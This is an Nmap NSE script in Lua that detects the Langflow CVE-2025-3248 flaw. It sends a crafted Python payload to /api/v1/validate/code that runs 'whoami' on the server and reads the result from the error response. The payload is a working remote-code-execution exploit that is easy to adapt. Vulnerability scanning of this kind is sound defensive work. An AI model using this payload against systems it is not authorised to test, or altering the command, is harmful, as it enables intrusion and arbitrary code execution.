local http = require "http"
local json = require "json"
local shortport = require "shortport"
local stdnse = require "stdnse"
local url = require "url"

description = [[
Checks for Langflow 1.3.0 RCE vulnerability (CVE-2025-3248) by sending a crafted payload to /api/v1/validate/code 
and checking the serverâ€™s error behavior for confirmation.
]]

author = "becrevex"
categories = {"discovery", "safe", "vuln"}
portrule = shortport.http

action = function(host, port)
  local base_url = string.format("http://%s:%d", host.targetname or host.ip, port.number)
  local target_path = "/api/v1/validate/code"
  local payload = {
    code = [[
    def run(cd=exec('raise Exception(__import__("subprocess").check_output("whoami", shell=True))')): pass
    ]]
  }

  local payload_encoded = json.encode(payload)

  local headers = {
    ["Content-Type"] = "application/json",
    ["Accept"] = "application/json",
    ["User-Agent"] = "Mozilla/5.0"
  }

  local response = http.post(host, port, target_path, payload_encoded, {header=headers})

  if not response then
    return "[!] No response from target"
  end

  if response.status == 200 and response.body then
    local status, decoded = pcall(json.decode, response.body)
    if status and decoded and decoded.function and decoded.function.errors then
      local error_msg = decoded.function.errors[1] or ""
      if error_msg:match("^b'") then
        return stdnse.format_output(true,
          "[+] Target appears VULNERABLE to CVE-2025-3248 Langflow validate/code RCE.",
          "Extracted error output: ",
          error_msg
        )
      end
    end
    return "[-] Target responded, but did not show signs of vulnerability."
  else
    return string.format("[-] Unexpected HTTP response: %s", response.status)
  end
end
